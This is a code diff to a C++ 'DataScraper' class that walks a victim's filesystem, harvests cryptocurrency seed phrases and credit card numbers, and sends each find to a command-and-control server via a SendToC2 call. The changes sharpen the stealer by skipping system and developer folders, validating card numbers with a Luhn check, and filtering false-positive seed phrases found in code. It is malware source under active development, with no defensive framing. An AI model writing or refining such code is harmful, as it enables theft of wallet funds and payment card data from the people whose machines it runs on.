@@ -224,16 +224,30 @@ void DataScraper::ScanDirectory(const std::string& path) {
                     ScanFile(entry.path().string());
                 } else if (entry.is_directory()) {
                     std::string dirName = entry.path().filename().string();
+                    // Skip OS, dev-tool, and junk directories to avoid false positives
                     if (dirName == "Windows" || dirName == "System32" ||
                         dirName == "System Volume Information" ||
                         dirName == "$Recycle.Bin" || dirName == "Recovery" ||
                         dirName == "Program Files" || dirName == "Program Files (x86)" ||
+                        dirName == "ProgramData" ||
                         dirName == "WinSxS" || dirName == "AppData" ||
                         dirName == "Microsoft" || dirName == "Assembly" ||
                         dirName == "Installer" || dirName == "Temp" ||
                         dirName == "cache" || dirName == "Cache" ||
                         dirName == "node_modules" || dirName == ".git" ||
-                        dirName[0] == '$') {
+                        dirName == ".vscode" || dirName == "extensions" ||
+                        dirName == "MinGW" || dirName == "mingw" ||
+                        dirName == "w64devkit" || dirName == "msys" ||
+                        dirName == "Python" || dirName == "Python3" ||
+                        dirName == "__pycache__" || dirName == "site-packages" ||
+                        dirName == "venv" || dirName == ".venv" ||
+                        dirName == "env" || dirName == ".env" ||
+                        dirName == ".npm" || dirName == ".cargo" ||
+                        dirName == ".local" || dirName == ".config" ||
+                        dirName == ".cache" || dirName == "cargo" ||
+                        dirName == "dist" || dirName == "build" ||
+                        dirName == "out" || dirName == "obj" ||
+                        dirName[0] == '.' || dirName[0] == '$') {
                         continue;
                     }
                     ScanDirectory(entry.path().string());
@@ -243,8 +257,50 @@ void DataScraper::ScanDirectory(const std::string& path) {
     } catch (...) {}
 }
 
+static bool IsDevToolPath(const std::string& path) {
+    // Convert to lowercase for case-insensitive matching
+    std::string lp = path;
+    std::transform(lp.begin(), lp.end(), lp.begin(), ::tolower);
+    static const std::vector<std::string> devPaths = {
+        "\\.vscode\\", "\\extensions\\", "\\mingw\\", "\\w64devkit\\",
+        "\\node_modules\\", "\\site-packages\\", "\\__pycache__\\",
+        "\\cargo\\", "\\.cargo\\", "\\.npm\\", "\\msys\\",
+        "\\python27\\", "\\python3\\", "\\venv\\", "\\.venv\\",
+        "\\dist\\", "\\build\\", "\\obj\\",
+        "\\programdata\\", "\\appdata\\local\\microsoft\\",
+        "\\appdata\\local\\programs\\"
+    };
+    for (const auto& dp : devPaths) {
+        if (lp.find(dp) != std::string::npos) return true;
+    }
+    // Also skip large JS/TS bundles (minified code) over 200KB
+    std::string ext = path.substr(path.find_last_of('.') + 1);
+    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
+    if (ext == "js" || ext == "ts" || ext == "jsx" || ext == "tsx") {
+        try {
+            uintmax_t sz = fs::file_size(path);
+            if (sz > 200 * 1024) return true;
+        } catch (...) {}
+    }
+    return false;
+}
+
+static bool LuhnCheck(const std::string& number) {
+    int sum = 0;
+    bool alternate = false;
+    for (int i = (int)number.length() - 1; i >= 0; i--) {
+        if (!isdigit(number[i])) return false;
+        int n = number[i] - '0';
+        if (alternate) { n *= 2; if (n > 9) n -= 9; }
+        sum += n;
+        alternate = !alternate;
+    }
+    return sum % 10 == 0;
+}
+
 void DataScraper::ScanFile(const std::string& path) {
     if (!m_running) return;
+    if (IsDevToolPath(path)) return;
     try {
         uintmax_t fileSize = fs::file_size(path);
         if (fileSize > 50 * 1024 * 1024) return;
@@ -372,13 +428,40 @@ void DataScraper::ScanTextForData(const std::string& text, const std::string& fi
         results.clear();
     }
 
-    if (FindSeedPhrases(text, results)) {
+    // Skip seed phrase scan for source/script files — too many false positives
+    static const std::unordered_set<std::string> skipSeedExts = {
+        "js", "ts", "jsx", "tsx", "py", "cpp", "c", "h", "cs", "java",
+        "php", "rb", "go", "rs", "xml", "html", "htm", "css", "scss"
+    };
+    std::string fext = filePath.substr(filePath.find_last_of('.') + 1);
+    std::transform(fext.begin(), fext.end(), fext.begin(), ::tolower);
+    bool skipSeeds = skipSeedExts.find(fext) != skipSeedExts.end();
+
+    if (!skipSeeds && FindSeedPhrases(text, results)) {
+        // Extra filter: reject if surrounding context looks like code
+        static const std::vector<std::string> codeIndicators = {
+            "function ", "const ", "var ", "let ", "return ", "import ",
+            "export ", "class ", " => ", "// ", "/* ", " { ", ";"
+        };
         for (const auto& seed : results) {
+            size_t pos = text.find(seed);
+            std::string ctx = "";
+            if (pos != std::string::npos) {
+                size_t start = pos > 200 ? pos - 200 : 0;
+                ctx = text.substr(start, 400 + seed.length());
+            }
+            bool looksLikeCode = false;
+            for (const auto& ind : codeIndicators) {
+                if (ctx.find(ind) != std::string::npos) { looksLikeCode = true; break; }
+            }
+            if (looksLikeCode) continue;
             m_itemsFound++;
             std::string data = "{\"type\":\"seed_phrase\",\"value\":\"" + escapeJson(seed) +
                                "\",\"source\":\"" + escapedPath + "\"}";
             SendToC2("found", data);
         }
+        results.clear();
+    } else {
         results.clear();
     }
 
@@ -405,6 +488,10 @@ bool DataScraper::FindCreditCards(const std::string& text, std::vector<std::stri
         std::string::const_iterator searchStart(text.cbegin());
         while (std::regex_search(searchStart, text.cend(), match, ccRegex)) {
             std::string cardNumber = match[0];
+            if (!LuhnCheck(cardNumber)) {
+                searchStart = match.suffix().first;
+                continue;
+            }
             size_t cardPos = match.position();
             size_t contextStart = (cardPos > 300) ? cardPos - 300 : 0;
             std::string context = text.substr(contextStart, cardPos - contextStart + 150 + cardNumber.length());
